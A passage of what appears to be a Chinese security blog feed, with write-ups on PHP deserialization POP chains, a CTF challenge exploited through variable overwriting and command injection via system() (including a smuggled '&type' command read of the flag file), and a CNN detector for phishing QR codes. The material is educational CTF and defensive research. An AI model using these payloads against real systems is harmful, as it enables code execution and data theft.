class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> start_gg());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞&quot;&gt;&lt;/a&gt;PHP反序列化漏洞&lt;/h1&gt;&lt;h3 id=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;a href=&quot;#PHP序列化与反序列化意义&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;/a&gt;PHP序列化与反序列化意义&lt;/h3&gt;&lt;p&gt;在开发的过程中常常遇到需要把&lt;strong&gt;对象&lt;/strong&gt;或者&lt;strong&gt;数组&lt;/strong&gt;进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列化&lt;/strong&gt;（串行化）：是将变量转换为可保存或传输的字符串的过程；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。&lt;/p&gt;
&lt;p&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
&lt;p&gt;常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 &lt;/p&gt;</summary>
    
    
    
    
    <category term="php反序列化" scheme="http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化案例</title>
    <link href="http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-11-09T00:36:36.000Z</published>
    <updated>2020-11-09T01:09:55.139Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞案例"><a href="#PHP反序列化漏洞案例" class="headerlink" title="PHP反序列化漏洞案例"></a>PHP反序列化漏洞案例</h2><p>在看php反序列化的时候遇到下面这个题，来自于：<a href="https://www.cnblogs.com/nul1/p/9928797.html%E3%80%82%E7%84%B6%E5%90%8E%E8%A7%A3%E7%AD%94%E6%9D%A5%E8%87%AA%E4%BA%8Ehttps://www.freebuf.com/articles/web/167721.html%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E5%B0%B1%E8%AF%B4%E4%B8%8B%E6%88%91%E8%B8%8F%E8%BF%87%E7%9A%84%E5%9D%91%E3%80%82">https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。</a></p><a id="more"></a><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(trim(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码可以分为两个阶段来看，第一个阶段就是如何进入到下面的反序列化代码中，第二个如何利用反序列化进行代码执行。</p><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>代码片段如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)&#123;</span><br><span class="line">    @parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到有两个<code>$$</code>直接反手一个变量覆盖，直接访问：<a href="http://127.0.0.1/test.php?first=doller&amp;var=give&amp;bbb=me&amp;ccc=flag%E3%80%82">http://127.0.0.1/test.php?first=doller&amp;var=give&amp;bbb=me&amp;ccc=flag。</a></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090938.png" alt="image-20201108152053284"></p><p>这怎么是个NO，仔细一看才知道这个变量覆盖只能利用一次，i++之后就进不去了。那只能往下看，注意到有个<code>parse_str</code>的函数。这个函数的作用如下，将键值对中的键直接变成了变量。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090603.png" alt="image-20201108152430924"></p><p>这会儿就要怎么考虑利用这个<code>a</code>了。浏览器在发起URL时，<strong>猜测</strong>本地应该会先分割，先用<code>&amp;</code>作为分割符，然后传输。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090608.png" alt="image-20201108153321042"></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090832.png" alt="image-20201108153527236"></p><p>对<code>&amp;</code>进行url编码后，后面所有的东西都会被浏览器当成a的值，这个时候才发送出去。</p><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>反序列化漏洞，变量覆盖之类的可以忽略了。简化代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(trim(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*|;?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$come</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>假设</strong>此时外部传入序列化后的字符串，函数调用顺序为：<code>wakeup  --&gt;  waf  --&gt;  destruct  --&gt;  echos</code>。然后随便写一个payload测试下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090635.png" alt="image-20201108155315502"></p><p>拿着这一串payload直接上，输出见下图。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090643.png" alt="image-20201108155406597"></p><p>然后就是过滤。直接看freebuf那片文章就行。在作者这篇文章中，给args传参为<code>&amp;type.\flaflagg.txt</code>，但是我测试了好久，始终没读到数据，然后调试发现那个<code>&amp;</code>有问题，发过去了服务端接收不了，所以一直报错。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090648.png" alt="image-20201108160403920"></p><p>然后使用url编码后，就直接能绕过去了。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090654.png" alt="image-20201108160449377"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;PHP反序列化漏洞案例&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞案例&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞案例&quot;&gt;&lt;/a&gt;PHP反序列化漏洞案例&lt;/h2&gt;&lt;p&gt;在看php反序列化的时候遇到下面这个题，来自于：&lt;a href=&quot;https://www.cnblogs.com/nul1/p/9928797.html%E3%80%82%E7%84%B6%E5%90%8E%E8%A7%A3%E7%AD%94%E6%9D%A5%E8%87%AA%E4%BA%8Ehttps://www.freebuf.com/articles/web/167721.html%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E5%B0%B1%E8%AF%B4%E4%B8%8B%E6%88%91%E8%B8%8F%E8%BF%87%E7%9A%84%E5%9D%91%E3%80%82&quot;&gt;https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php反序列化" scheme="http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>基于CNN的二维码钓鱼检测</title>
    <link href="http://example.com/2020/08/08/%E5%9F%BA%E4%BA%8ECNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%E6%A3%80%E6%B5%8B/"/>
    <id>http://example.com/2020/08/08/%E5%9F%BA%E4%BA%8ECNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%E6%A3%80%E6%B5%8B/</id>
    <published>2020-08-08T15:33:15.000Z</published>
    <updated>2021-02-04T05:16:51.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于深度学习的二维码钓鱼检测"><a href="#基于深度学习的二维码钓鱼检测" class="headerlink" title="基于深度学习的二维码钓鱼检测"></a>基于深度学习的二维码钓鱼检测</h1><h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>​        网络钓鱼是攻击者利用欺骗性的邮件和伪造的web站点进行网络诈骗，受害者往往会泄露自己的个人信息，如身份证、信用卡、各类密码等。诈骗者会将网站伪造的和正常网站一样，可以是更新flash界面、游戏活动登录领取奖励等界面，从而植入木马或者盗取用户信息。然而最近新出现的扫描二维码实现钓鱼也频频出现在各种场合。</p><p>​        最近偶然看到<code>Kali Linux</code>上出现了一种二维码的恶意链接钓鱼方式（以前没怎么使用过，没太关注）。这种方式比直接使用URL进行钓鱼要更加隐蔽一些，下面使用<code>TIM</code>和<code>微信</code>截屏证明了。于是就想能不能使用卷积神经网络识别含有恶意链接的二维码，最终发现使用CNN神经网络识别恶意的URL的成功率竟然能达到80%。</p><h2 id="Kali-Linux-生成恶意二维码"><a href="#Kali-Linux-生成恶意二维码" class="headerlink" title="Kali Linux 生成恶意二维码"></a>Kali Linux 生成恶意二维码</h2><p>点开 <code>Social-Engineer Toolkit</code></p><p><img src="/images/image-20200806224745793.png" alt="image-20200806224745793"></p><p>然后就能看到<code>QRCode Generator Attack Vector</code></p><p><img src="/images/image-20200806224817953.png" alt="image-20200806224817953"></p><p>以百度为例，生成一个二维码</p><p><img src="/images/image-20200806225114742.png" alt="image-20200806225114742"></p><p>生成的二维码如图所示，使用微信扫码直接能打开百度网页。</p><img src="/images/image-20200806225341844.png" width="150px" height="150px" /><h2 id="卷积神经网络识别恶意二维码"><a href="#卷积神经网络识别恶意二维码" class="headerlink" title="卷积神经网络识别恶意二维码"></a>卷积神经网络识别恶意二维码</h2><h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><p>从Kaggle数据上下载了一些恶意的钓鱼URL，数据情况如下：</p><p><img src="/images/image-20200806231132522.png" alt="image-20200806231132522"></p><p>然后清洗数据集（删除过于长的url），使用python直接转换成二维码的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qr = qrcode.QRCode(version=<span class="number">2</span>, error_correction=qrcode.constants.ERROR_CORRECT_L,</span><br><span class="line">box_size=<span class="number">5</span>, border=<span class="number">0</span>) <span class="comment">#设置二维码的大小</span></span><br><span class="line">qr.add_data(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">qr.make(fit=<span class="literal">True</span>)</span><br><span class="line">img = qr.make_image()</span><br><span class="line">img.save(<span class="string">&quot;./baidu.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用上面生成的二维码图像如下，这时候使用微信和qq直接扫二维码就能直接打开网页</p><p><img src="/images/test.png" alt="test"></p><p>并且可以看到使用<code>微信</code>和<code>qq</code>扫描二维码打开的网页并没有地址栏显示URL，如下图：</p><p><img src="/images/Screenshot_20200808_221519.jpg" width=300 />                                                 <img src="/images/Screenshot_20200808_221459.jpg" width=300 /></p><p>左图是使用TIM扫码打开的网页，右图是使用微信扫码打开的网页。均没有显示url地址栏，这样的钓鱼方式比起直接使用url钓鱼更加隐蔽。</p><h3 id="检测模型的搭建"><a href="#检测模型的搭建" class="headerlink" title="检测模型的搭建"></a>检测模型的搭建</h3><p>卷积神经网络模型由两个卷积层、两个池化层以及一个全连接层组成：</p><img src="/images/model.png" width=400 /><p>卷积神经网络模型源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv2D(<span class="number">32</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=input_shape)) <span class="comment"># 